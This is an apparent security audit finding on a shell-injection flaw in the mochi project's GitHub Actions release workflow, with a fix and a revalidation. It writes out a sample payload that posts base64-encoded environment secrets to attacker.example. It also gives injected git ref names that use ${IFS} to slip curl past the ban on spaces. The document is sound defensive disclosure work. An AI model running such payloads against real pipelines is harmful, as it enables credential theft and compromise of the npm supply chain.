# [MEDIUM] Shell injection via workflow_dispatch `tag` input in a job holding the npm publishing credential

**File:** [`.github/workflows/release.yml`](https://github.com/khromov/mochi/blob/main/.github/workflows/release.yml#L200-L179) (lines 200, 184, 20, 179)
**Project:** mochi
**Severity:** MEDIUM  •  **Confidence:** high  •  **Slug:** `other-ci-script-injection`

## Owners

**Suggested assignee:** `stanislav.khromov+github@gmail.com` _(via last-committer)_

## Finding

The `republish` job interpolates the user-supplied `workflow_dispatch` input directly into a shell script: `tag='${{ inputs.tag }}'` (L200). GitHub Actions expands `${{ }}` into the generated step script before bash parses it, so a single apostrophe terminates the quoting and everything after it is executed as shell. For example `tag` = `x'; curl -sd "$(env|base64 -w0)" https://attacker.example; '` runs the attacker's command. The `case "$tag" in ... *) exit 1` validation on L201-207 is useless as a guard because it runs after the injected commands have already executed.

Impact is amplified by the job's credentials. `permissions:` is declared workflow-wide (L17-20) with `contents: write` and `id-token: write`, and CONTRIBUTING.md:41 documents that this repo uses npm trusted publishing with no NPM_TOKEN: "The `release` workflow requests `id-token: write` and `npm publish --provenance` exchanges that for a short-lived credential," bound to the repository and this workflow file - with no GitHub `environment` restriction. Injected code can therefore request the OIDC token itself (`$ACTIONS_ID_TOKEN_REQUEST_URL` / `$ACTIONS_ID_TOKEN_REQUEST_TOKEN` are in the step environment) and publish arbitrary tarballs as `mochi-framework`, `create-mochi`, `@mochi-framework/rsvelte`, or `@mochi-framework/svelte-shaker` - a supply-chain compromise of public npm packages - and use `contents: write` to push to the repo.

Precondition: `workflow_dispatch` requires repository write access. That is still a meaningful escalation, because CONTRIBUTING.md:48 instructs enabling branch protection on `main` requiring the `test` workflow - this path bypasses that gate entirely and needs no reviewed commit.

## Recommendation

Never interpolate `${{ inputs.* }}` into a `run:` body. Pass it through the environment instead, which bash treats as data rather than script text: add `env:` to the step with `TAG: ${{ inputs.tag }}` and change the script to match on `case "$TAG" in`, keeping the same four package-directory branches and the error branch. Additionally validate the input against a strict allowlist regex before use, and bind the npm trusted publisher to a protected GitHub `environment` with required reviewers so a compromised step cannot publish unattended.

## Revalidation

**Verdict:** true-positive

The injection is real and present in the current file: release.yml:200 is `tag='${{ inputs.tag }}'`, and the 4b942c4d hardening commit only pinned action SHAs — it never touched this line. GitHub Actions expands `${{ }}` into the generated step script before bash parses it, so a single apostrophe in the input terminates the quoting; the `case` allowlist at 201-207 runs after the injected commands, so it is not a guard. The job does hold the publishing credential: workflow-level `permissions: contents: write / id-token: write` (17-20) applies to `republish`, there is no `environment:` gate, and CONTRIBUTING.md:41 confirms npm trusted publishing with no NPM_TOKEN, so injected code can mint the OIDC credential itself. I verified the full chain is feasible rather than theoretical: `inputs.tag` is also the `actions/checkout` ref at line 184, so the value must resolve to a real ref or the job dies before line 200 — and I confirmed with `git check-ref-format` in a scratch repo that payload-bearing names such as `refs/tags/mochi-framework-v1.0.0';id;#` and `…';curl${IFS}evil.example;#` are valid git ref names (space is the only blocked metacharacter, and `${IFS}` sidesteps it), so a write-capable actor can push such a tag and then dispatch with it. I am downgrading HIGH to MEDIUM because the escalation argument is overstated: `workflow_dispatch` requires repository write access, and a dispatch runs the workflow file from the *dispatched ref*, so the same actor can simply push a modified `release.yml` on an unprotected branch and publish directly — npm trusted publishing has no branch field and no environment is configured here, so that simpler path yields the identical credential and equally bypasses the `test` required check. This is therefore a defense-in-depth defect rather than a broken privilege boundary. It is still worth the one-line `env:` fix, and notably the injection would become the *only* viable path if the trusted publisher were ever bound to a ref/environment, since the payload rides in an input while the run's ref stays `main`.

## Recent committers (`git log`)

- Stanislav Khromov <stanislav.khromov+github@gmail.com> (2026-09-07)
